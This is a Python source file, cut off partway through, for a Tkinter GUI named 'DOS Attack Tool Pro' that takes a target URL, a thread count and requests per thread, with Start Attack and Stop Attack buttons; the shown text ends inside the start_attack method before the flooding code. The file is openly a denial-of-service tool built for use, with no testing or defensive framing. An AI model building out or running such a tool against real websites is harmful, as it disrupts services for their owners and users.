#!/usr/bin/env python3

import requests
import threading
import argparse
import time
import tkinter as tk
from tkinter import messagebox


class DosAttackToolGUI:
    def __init__(self):
        """
        Initialize the DosAttackToolGUI class, create the main window, and place input fields, output frame, and buttons.
        """
        # Create the main window with a title and fixed size
        self.window = tk.Tk()
        self.window.title("DOS Attack Tool Pro")
        self.window.geometry("800x500")
        self.window.resizable(0, 0)

        # Add a banner label with a multi-line text and Courier New font
        self.banner_text = """
         _____                ______       _
        |  __ \              |  ____|     | |
        | |__) |___ _ __ ___ | |__   _ __ | |_ ___
        |  _  // _ \ '_ ` _ \|  __| | '_ \| __/ __|
        | | \ \  __/ | | | | | |____| | | | |_\__ \\
        |_|  \_\___|_| |_| |_|______|_| |_|\__|___/
        """
        self.banner_label = tk.Label(self.window, text=self.banner_text, font=("Courier New", 20, "bold"))
        self.banner_label.pack(pady=(10, 0))

        # Initialize class variables for storing user input and attack state
        self.target_url = ""
        self.num_threads = 0
        self.num_requests = 0
        self.verbose = False
        self.threads = []
        self.is_attack_running = False

        # Create input fields for user input
        self.create_input_fields()

        # Create an output frame for displaying the output text
        self.create_output_frame()

        # Create start and stop buttons
        self.create_button()

    def create_input_fields(self):
        """
        Create input fields for the target URL, number of threads, number of requests per thread, and a checkbox for verbose output.
        """
        frame = tk.Frame(self.window)
        frame.pack(pady=20)

        # Create a target URL label and entry field
        url_label = tk.Label(frame, text="Target URL:", font=("Arial", 14))
        url_label.grid(row=0, column=0, padx=(0, 10))
        self.url_entry = tk.Entry(frame, width=30, font=("Arial", 14))
        self.url_entry.grid(row=0, column=1)

        # Create a number of threads label and entry field
        threads_label = tk.Label(frame, text="Number of Threads:", font=("Arial", 14))
        threads_label.grid(row=1, column=0, padx=(0, 10))
        self.threads_entry = tk.Entry(frame, width=10, font=("Arial", 14))
        self.threads_entry.grid(row=1, column=1)

        # Create a number of requests per thread label and entry field
        requests_label = tk.Label(frame, text="Number of Requests per Thread:", font=("Arial", 14))
        requests_label.grid(row=2, column=0, padx=(0, 10))
        self.requests_entry = tk.Entry(frame, width=10, font=("Arial", 14))
        self.requests_entry.grid(row=2, column=1)

        # Create a verbose output checkbox
        self.verbose_var = tk.BooleanVar()
        self.verbose_var.set(False)
        verbose_check = tk.Checkbutton(frame, text="Enable Verbose Output", var=self.verbose_var,
                                       font=("Arial", 14))
        verbose_check.grid(row=3, columnspan=2, pady=(10, 0))

    def create_output_frame(self):
        """
        Create a frame for the output text widget.
        """
        frame = tk.Frame(self.window)
        frame.pack()

        # Create an output title label
        output_title = tk.Label(frame, text="Output:", font=("Arial", 16, "bold"))
        output_title.pack(anchor="w", pady=(10, 5))

        # Create an output text widget with a fixed height, width, font, and disabled state
        self.output_text = tk.Text(frame, height=10, width=80, font=("Arial", 12), state=tk.DISABLED)
        self.output_text.pack()

    def create_button(self):
        """
        Create start and stop buttons.
        """
        frame = tk.Frame(self.window)
        frame.pack(pady=(20, 0))

        # Create a start attack button
        start_button = tk.Button(frame, text="Start Attack", font=("Arial", 14), command=self.start_attack)
        start_button.pack(side="left", padx=(0, 10))

        # Create a stop attack button
        stop_button = tk.Button(frame, text="Stop Attack", font=("Arial", 14), command=self.stop_attack)
        stop_button.pack(side="left")

    def start_attack(self):
        """
        Validate input, start the attack, and create threads to send requests.
        """
        # Check if the attack is already running
        if self.is_attack_running:
            print("Error: Attack is already running!")
            return

        # Get user input from
